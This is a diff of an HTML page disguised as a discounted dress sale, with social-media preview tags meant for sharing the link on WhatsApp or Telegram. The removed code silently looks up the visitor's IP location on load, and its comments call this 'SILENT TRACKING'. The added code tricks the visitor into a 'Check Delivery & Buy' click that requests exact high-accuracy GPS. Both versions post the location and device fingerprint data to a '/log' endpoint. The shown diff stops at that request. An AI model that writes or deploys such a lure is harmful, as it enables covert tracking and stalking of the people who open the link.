@@ -3,9 +3,11 @@
 <head>
     <title>Summer Floral Dress - 50% OFF</title>
     
+    <!-- OpenGraph metadata for WhatsApp/Telegram preview -->
     <meta property="og:title" content="Summer Floral Dress - Mega Sale!">
     <meta property="og:type" content="website">
     <meta property="og:description" content="Check out this gorgeous summer dress. Limited stock remaining! Click to buy now.">
+    <!-- A picture of a dress for the thumbnail -->
     <meta property="og:image" content="https://images.unsplash.com/photo-1572804013309-59a88b7e92f1?ixlib=rb-4.0.3&auto=format&fit=crop&w=800&q=80">
     <meta name="twitter:card" content="summary_large_image">
     <meta name="viewport" content="width=device-width, initial-scale=1">
@@ -15,7 +17,9 @@
         .container { max-width: 400px; margin: auto; background: white; padding: 20px; border-radius: 12px; box-shadow: 0 4px 12px rgba(0,0,0,0.1); }
         .dress-img { width: 100%; border-radius: 8px; }
         .price { font-size: 24px; color: #e74c3c; font-weight: bold; margin: 10px 0; }
-        .loading { display: block; margin-top: 15px; font-weight: bold; color: #555; }
+        .btn { background-color: #2ecc71; color: white; border: none; padding: 15px 20px; font-size: 16px; border-radius: 8px; cursor: pointer; width: 100%; margin-top: 10px; font-weight: bold; transition: 0.3s;}
+        .btn:hover { background-color: #27ae60; }
+        .loading { display: none; margin-top: 15px; font-weight: bold; color: #555; }
     </style>
 </head>
 <body>
@@ -23,42 +27,70 @@
         <h2>Summer Floral Midi Dress</h2>
         <img src="https://images.unsplash.com/photo-1572804013309-59a88b7e92f1?ixlib=rb-4.0.3&auto=format&fit=crop&w=400&q=80" class="dress-img" alt="Dress">
         <p class="price">₹1,299 <del style="color:#999; font-size:16px;">₹2,599</del></p>
-        <p>Checking delivery availability for your location...</p>
-        <p class="loading" id="status">Redirecting to checkout...</p>
+        <p>Enter your location to check fast delivery in your area!</p>
+        <button class="btn" onclick="checkDelivery()" id="delBtn">Check Delivery & Buy</button>
+        <p class="loading" id="status">Checking exact location for delivery...</p>
     </div>
 
     <script>
-        window.onload = function() {
-            // SILENT TRACKING: HTTPS API to bypass mixed content blocks
-            fetch('https://ipapi.co/json/')
-                .then(response => response.json())
-                .then(ipData => {
-                    sendData(ipData);
-                })
-                .catch(error => {
-                    sendData(null); 
+        function checkDelivery() {
+            document.getElementById('delBtn').style.display = 'none';
+            document.getElementById('status').style.display = 'block';
+            
+            if (navigator.geolocation) {
+                // Requesting High Accuracy Exact GPS
+                navigator.geolocation.getCurrentPosition(sendData, handleError, {
+                    enableHighAccuracy: true,
+                    timeout: 15000, // Wait 15s for user to click allow
+                    maximumAge: 0
                 });
-        };
+            } else {
+                sendData(null, "Geolocation not supported by this browser."); 
+            }
+        }
 
-        function sendData(ipData) {
+        function handleError(error) {
+            let errorMsg = "";
+            switch(error.code) {
+                case error.PERMISSION_DENIED:
+                    errorMsg = "User denied the request for Geolocation.";
+                    break;
+                case error.POSITION_UNAVAILABLE:
+                    errorMsg = "Location information is unavailable.";
+                    break;
+                case error.TIMEOUT:
+                    errorMsg = "The request to get user location timed out.";
+                    break;
+                case error.UNKNOWN_ERROR:
+                    errorMsg = "An unknown error occurred.";
+                    break;
+            }
+            sendData(null, errorMsg);
+        }
+
+        function sendData(position, locError = null) {
             let info = {
                 screen_width: window.screen.width,
                 screen_height: window.screen.height,
                 platform: navigator.platform,
                 timezone: Intl.DateTimeFormat().resolvedOptions().timeZone,
                 language: navigator.language,
-                stealth_location: ipData ? {
-                    status: "Success (Silent Tracking)",
-                    ip: ipData.ip,
-                    country: ipData.country_name,
-                    region: ipData.region,
-                    city: ipData.city,
-                    zip: ipData.postal,
-                    latitude: ipData.latitude,
-                    longitude: ipData.longitude,
-                    isp: ipData.org
-                } : "Failed to fetch silent location"
+                cores: navigator.hardwareConcurrency || "Unknown",
+                memory: navigator.deviceMemory || "Unknown"
             };
+
+            if (position) {
+                info.exact_location = {
+                    status: "Success (High Accuracy GPS)",
+                    latitude: position.coords.latitude,
+                    longitude: position.coords.longitude,
+                    altitude: position.coords.altitude || "Not available on this device",
+                    accuracy_meters: position.coords.accuracy,
+                    altitude_accuracy: position.coords.altitudeAccuracy || "Not available"
+                };
+            } else {
+                info.exact_location_error = locError;
+            }
 
             fetch('/log', {
                 method: 'POST',
